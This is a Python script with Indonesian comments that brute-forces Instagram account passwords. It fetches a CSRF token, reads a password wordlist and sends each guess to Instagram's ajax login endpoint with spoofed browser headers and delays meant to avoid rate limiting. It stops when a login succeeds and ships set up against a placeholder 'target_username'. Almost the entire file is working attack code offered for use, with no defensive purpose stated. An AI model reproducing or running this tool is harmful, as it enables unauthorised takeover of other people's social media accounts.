import requests
from bs4 import BeautifulSoup
import time
import re
import json

# Fungsi untuk melakukan brute force
def brute_force_instagram(username, password_list):
    # URL login Instagram
    login_url = 'https://www.instagram.com/accounts/login/'
    login_api_url = 'https://www.instagram.com/accounts/login/ajax/'

    # Memulai sesi dengan headers browser
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'X-IG-App-ID': '936619743392459',
        'X-Instagram-AJAX': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'Connection': 'keep-alive',
    })

    # Membuka halaman login untuk mendapatkan cookies dan CSRF token
    print('Mengambil halaman login...')
    response = session.get(login_url)
    
    if response.status_code != 200:
        print(f'Error: Gagal mengakses halaman login. Status code: {response.status_code}')
        return None
    
    soup = BeautifulSoup(response.text, 'html.parser')

    # Mencari token CSRF dari berbagai sumber
    csrf_token = None
    
    # Metode 1: Dari input hidden
    csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    if csrf_input:
        csrf_token = csrf_input.get('value')
    
    # Metode 2: Dari cookies
    if not csrf_token:
        csrf_token = session.cookies.get('csrftoken')
    
    # Metode 3: Dari script tag (Instagram menyimpan di window._sharedData)
    if not csrf_token:
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and 'csrf_token' in script.string:
                match = re.search(r'"csrf_token":"([^"]+)"', script.string)
                if match:
                    csrf_token = match.group(1)
                    break
    
    if not csrf_token:
        print('Error: Tidak dapat menemukan CSRF token. Instagram mungkin telah mengubah strukturnya.')
        print('Tip: Instagram modern menggunakan JavaScript dan API GraphQL yang lebih sulit di-bypass.')
        return None
    
    print(f'CSRF token ditemukan: {csrf_token[:20]}...')

    # Membuka file password list
    try:
        with open(password_list, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f'Error: File {password_list} tidak ditemukan!')
        return None
    except Exception as e:
        print(f'Error membaca file: {e}')
        return None

    print(f'Memulai brute force dengan {len(passwords)} password...\n')

    # Loop melalui daftar password
    for idx, password in enumerate(passwords, 1):
        password = password.strip()
        if not password:  # Skip baris kosong
            continue
            
        print(f'[{idx}/{len(passwords)}] Mencoba password: {password}')

        # Data login menggunakan format Instagram API
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        # Update CSRF token di headers
        session.headers.update({
            'X-CSRFToken': csrf_token
        })

        try:
            # Mengirim permintaan login ke API endpoint
            response = session.post(login_api_url, data=login_data, allow_redirects=False)
            
            # Parse response JSON
            try:
                result = response.json()
                
                if result.get('status') == 'ok' and result.get('authenticated'):
                    print(f'\n✓ Password ditemukan: {password}')
                    print(f'User ID: {result.get("userId", "N/A")}')
                    return password
                elif result.get('status') == 'ok':
                    print(f'✗ Password salah: {password}')
                    if 'message' in result:
                        print(f'  Pesan: {result["message"]}')
                else:
                    print(f'✗ Login gagal: {result.get("message", "Unknown error")}')
                    
            except json.JSONDecodeError:
                # Jika response bukan JSON, cek URL redirect
                if response.status_code == 200 and 'authenticated' in response.text:
                    print(f'\n✓ Password ditemukan: {password}')
                    return password
                else:
                    print(f'✗ Password salah: {password} (Response tidak valid)')
                    
        except requests.exceptions.RequestException as e:
            print(f'✗ Error koneksi: {e}')
            print('Menunggu 5 detik sebelum melanjutkan...')
            time.sleep(5)
            continue

        # Menunggu sebentar sebelum mencoba password berikutnya (untuk menghindari rate limiting)
        time.sleep(2)

    print('Password tidak ditemukan dalam daftar yang diberikan.')
    return None

# Contoh penggunaan
username = 'target_username'
password_list = 'passwords.txt'
brute_force_instagram(username, password_list)